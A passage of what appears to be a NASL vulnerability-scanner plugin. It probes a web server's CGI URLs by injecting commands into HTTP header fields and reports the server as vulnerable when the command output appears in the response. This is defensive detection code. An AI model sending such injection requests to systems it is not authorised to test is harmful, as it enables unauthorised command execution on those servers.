          req += string( "User-Agent: ", useragent, "\r\n" );

        req += string( http_field, ": ", attack, "\r\n",
                       "Connection: close\r\n",
                       "Accept: */*\r\n\r\n" );
        res = http_send_recv( port:port, data:req );

        if( res && egrep( string:res, pattern:pattern, icase:FALSE ) ) {
          uid = eregmatch( pattern:"(" + pattern + ")", string:res, icase:FALSE );

          info["HTTP Method"] = method;
          info["Affected URL"] = http_report_vuln_url( port:port, url:url, url_only:TRUE );
          info['HTTP "' + http_field + '" header'] = attack;

          report  = 'By doing the following HTTP request:\n\n';
          report += text_format_table( array:info ) + '\n\n';
          report += 'it was possible to execute the command "' + cmd + '".';
          report += '\n\nResult:\n\n' + uid[1];
          expert_info = 'Request:\n\n' + req + '\n\nResponse:\n\n' + res;
          security_message( port:port, data:report, expert_info:expert_info );
          exit( 0 );
        }
      }
    }
  }
}

function add_files( extensions ) {

  local_var extensions;
  local_var ext, e;

  foreach ext( extensions ) {
    if( "-" >< ext ) {
      e = split( ext, sep:" - ", keep:FALSE );
      if( isnull( e[0] ) )
        continue;
      ext = e[0];
      ext = chomp( ext );
    }

    if( ereg( pattern:"\.(js|css|gif|png|jpeg|jpg|pdf|ico)$", string:tolower( ext ) ) )
      continue;

    # nb: "cgis" list will be made "unique" later
    cgis[i++] = ext;
  }
}

# nb: If all found files and not only the ones from the default list should be checked. Note that if
# "Enable generic web application scanning" in "global_settings.nasl" is set to "no" (which is the
# default) the KB key below is set to "TRUE".
# By default we're also checking if the .cgi / file is accessible (means a 200 status code) before
# sending the actual attacking requests because each tested URLs requires 16 HTTP requests. This
# should improve scan speed for full and fast scans a little while giving users the flexibility to
# do enable more throughout tests.
no_extended_checks = get_kb_item( "global_settings/disable_generic_webapp_scanning" );
check_for_200 = no_extended_checks;

port = http_get_port( default:80 );

cmds = exploit_commands( "linux" );

if( ! no_extended_checks ) {
  # nb: This is expected to be here, we're using the same call later to add the port to the host header...
  host = http_host_name( dont_add_port:TRUE );
  extensions = http_get_kb_file_extensions( port:port, host:host, ext:"*" );
  if( extensions )
    add_files( extensions:extensions );

  kb_cgis = http_get_kb_cgis( port:port, host:host );
  if( kb_cgis )
    add_files( extensions:kb_cgis );
}

# nb: Make the list "unique" after the add_files() call above to avoid having
# multiple entries in the list.
cgis = make_list_unique( cgis );

useragent = http_get_user_agent();
vtstrings = get_vt_strings();
vt_string = vtstrings["default"];
host = http_host_name( port:port );

foreach url( cgis ) {
  foreach pattern( keys( cmds ) ) {
    cmd = cmds[pattern];
    _check( url:url, port:port, host:host, useragent:useragent, vt_string:vt_string, check_for_200:check_for_200, cmd:cmd, pattern:pattern );
  }
}

exit( 99 );
